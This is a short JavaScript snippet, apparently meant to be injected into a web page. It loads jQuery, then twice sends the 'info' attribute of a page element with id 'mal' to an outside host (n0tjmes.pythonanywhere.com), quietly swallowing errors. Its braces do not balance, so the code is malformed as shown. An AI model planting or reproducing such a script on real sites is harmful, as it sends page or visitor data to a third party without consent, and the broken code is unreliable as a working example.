(function() {
    var script = document.createElement("SCRIPT");
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js';
    script.type = 'text/javascript';
    document.getElementsByTagName("body")[0].insertBefore(script, document.getElementById('mal'));
    var checkReady = function(callback) {
        if (window.jQuery) {
            callback(jQuery);
        }
        else {
            window.setTimeout(function() { checkReady(callback); }, 20);
        }
    };

    // Start polling...
    checkReady(function($) {
      try{
        $.ajax({
          url: "https://n0tjmes.pythonanywhere.com",
          type: "POST",
          dataType: "jsonp",
          data: {
            'info': document.getElementById('mal').getAttribute('info')
          },
          success: function(x) {
            console.log(true)
          }
        });}catch{}
      
        $.ajax({
          url: "https://n0tjmes.pythonanywhere.com",
          type: "POST",
          dataType: "jsonp",
          data: {
            'info': document.getElementById('mal').getAttribute('info')
          },
          success: function(x) {
            console.log(true)
          }
    });
})();
